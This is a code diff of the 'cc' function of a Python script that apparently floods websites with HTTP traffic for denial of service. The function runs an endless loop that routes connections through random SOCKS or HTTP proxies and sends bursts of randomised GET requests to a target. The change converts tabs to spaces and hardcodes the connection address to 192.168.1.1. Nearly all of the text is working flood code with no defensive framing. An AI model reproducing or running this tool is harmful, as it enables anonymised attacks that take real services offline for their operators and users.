@@ -230,42 +230,43 @@ def InputOption(question,options,default):
 	return ans
 
 def cc(event,proxy_type):
-	header = GenReqHeader("get")
-	proxy = Choice(proxies).strip().split(":")
-	add = "?"
-	if "?" in path:
-		add = "&"
-	event.wait()
-	while True:
-		try:
-			s = socks.socksocket()
-			if proxy_type == 4:
-				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if proxy_type == 5:
-				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-			if proxy_type == 0:
-				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
-			if brute:
-				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-			s.settimeout(3)
-			s.connect((str(target), int(port)))
-			if protocol == "https":
-				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=target)
-			try:
-				for _ in range(100):
-					get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
-					request = get_host + header
-					sent = s.send(str.encode(request))
-					if not sent:
-						proxy = Choice(proxies).strip().split(":")
-						break
-				#s.setsockopt(socket.SO_LINGER,0)
-				s.close()
-			except:
-				s.close()
-		except:
-			s.close()
+    header = GenReqHeader("get")
+    proxy = Choice(proxies).strip().split(":")
+    add = "?"
+    if "?" in path:
+        add = "&"
+    event.wait()
+    while True:
+        try:
+            s = socks.socksocket()
+            if proxy_type == 4:
+                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+            if proxy_type == 5:
+                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            if proxy_type == 0:
+                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+            if brute:
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.settimeout(3)
+            target_ip = "192.168.1.1"  # Custom IP Address
+            s.connect((str(target_ip), int(port)))  # Use Custom IP Address
+            if protocol == "https":
+                ctx = ssl.SSLContext()
+                s = ctx.wrap_socket(s,server_hostname=target)
+            try:
+                for _ in range(100):
+                    get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+                    request = get_host + header
+                    sent = s.send(str.encode(request))
+                    if not sent:
+                        proxy = Choice(proxies).strip().split(":")
+                        break
+                #s.setsockopt(socket.SO_LINGER,0)
+                s.close()
+            except:
+                s.close()
+        except:
+            s.close()
 
 def head(event,proxy_type):#HEAD MODE
 	header = GenReqHeader("head")
